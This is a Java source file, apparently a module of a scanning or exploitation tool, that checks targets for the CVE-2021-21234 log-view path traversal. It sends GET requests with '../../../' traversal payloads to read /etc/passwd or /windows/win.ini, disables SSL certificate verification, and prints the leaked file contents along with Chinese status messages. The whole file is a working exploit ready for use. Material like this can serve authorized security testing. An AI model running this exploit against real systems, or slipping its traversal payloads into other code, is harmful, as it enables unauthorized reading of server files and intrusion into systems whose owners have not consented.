package src.main.module;

import src.main.common.HTTPConfig;
import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;

import static src.main.ssl.sslVer.disableSSLVerification;

public class LogViewFileLeak {
    private String address;
    private String filename;
    public  String text;
    public LogViewFileLeak(String address,String filename){
        this.address = address;
        this.filename = filename;
    }

    public void Exp(ResultCallback callback){
        String base = "../../../../../../../../";
        String[] apis = {
                "/manage/log/view?filename=/etc/passwd&base=" + base,
                "/log/view?filename=/etc/passwd&base=" + base,
                "/manage/log/view?filename=/windows/win.ini&base=" + base,
                "/log/view?filename=/windows/win.ini&base=" + base
        };
        disableSSLVerification();
        try{
            for (String api : apis) {
                try {
                    HttpURLConnection conn = HTTPConfig.createConnection(address + api);
                    conn.setRequestMethod("GET");
                    // 配置连接和发送请求
                    int responseCode = conn.getResponseCode();
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine).append(System.lineSeparator());
                    }
                    in.close();
                    if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains("root")||response.toString().contains("MAPI"))){
                        text = "检测到CVE-2021-21234漏洞";
                        callback.onResult(text);
                        text = "地址为: " + address + api;
                        callback.onResult(text);
                        text = "文件内容为: " + "\n" + response;
                        callback.onResult(text);
                        break;
                    }else{
                        text = "未找到CVE-2021-21234漏洞";
                        callback.onResult(text);
                    }
                    conn.disconnect(); // 关闭连接
                } catch (Exception e) {
                    text = "遍历请求异常";
                    callback.onResult(text);
                    e.printStackTrace();
                }
            }
        } catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
